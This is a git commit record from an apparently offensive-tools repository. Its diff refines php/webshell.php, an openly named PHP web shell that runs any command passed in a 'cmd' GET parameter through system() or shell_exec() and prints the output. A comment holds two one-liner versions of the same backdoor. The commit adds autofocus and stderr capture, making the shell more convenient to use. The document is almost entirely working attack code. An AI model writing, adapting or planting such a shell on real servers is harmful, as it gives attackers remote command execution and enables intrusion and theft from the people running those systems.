d6b5d9d2ac812b3a6a2ec6b3ea6cccb28efe01b7
TheTechromancer <thetechromancer@protonmail.com>
2018-03-04 03:00:28 -0600

    added autofocus, formatting fixes

--- php/webshell.php
+++ php/webshell.php
@@ -1,20 +1,21 @@
-<?
+<?php
 	/* basic oneliner: <?php echo shell_exec($_GET['c'].' 2>&1'); ?>
 	   tiny oneliner: <?php system($_GET['c']); ?> */
 ?>
 
 <html>
-	<body>
-	<form method="GET" name="myform" action="">
+	<body onLoad="self.focus();document.f.cmd.focus()">
+	<form method="GET" name="f" action="">
 		<input type="text" name="cmd">
-		<input type="submit" value="Send">
+		<input type="submit" value="exec">
 	</form>
 	<pre>
-		<?
-		if($_GET['cmd']) {
-		  system($_GET['cmd']);
-		  }
-		?>
+
+<?php
+if($_GET['cmd'])
+	echo shell_exec($_GET['cmd'].' 2>&1');
+?>
+
 	</pre>
 	</body>
 </html>
